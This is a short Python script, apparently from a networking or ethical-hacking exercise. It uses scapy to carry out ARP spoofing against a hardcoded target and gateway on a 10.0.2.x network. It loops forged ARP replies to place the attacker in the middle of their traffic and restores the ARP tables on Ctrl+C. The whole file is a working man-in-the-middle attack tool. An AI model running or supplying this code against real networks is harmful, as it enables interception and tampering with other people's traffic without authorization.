import scapy.all as scapy
import time
import sys

def get_mac(ip):  # jenu ip  ano mac address
    arp_request = scapy.ARP(pdst=ip)

    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip,source_ip):
    destination_mac=get_mac(destination_ip)
    source_mac=get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send( packet, count=4, verbose=False )


restore("10.0.2.21", "10.0.2.1")


send_packets_count = 0
target_ip = "10.0.2.21"
getway_id = "10.0.2.1"
try:
    while True:
        spoof(target_ip, getway_id)
        spoof(getway_id, target_ip)
        send_packets_count += 2
        print("\r[+] sent:" + str(send_packets_count)),
        sys.stdout.flush()
        time.sleep(2)

except KeyboardInterrupt:
    print("[-] Detected ctrl+c.....Restoring ARp table please wait\n")
    restore(target_ip, getway_id)
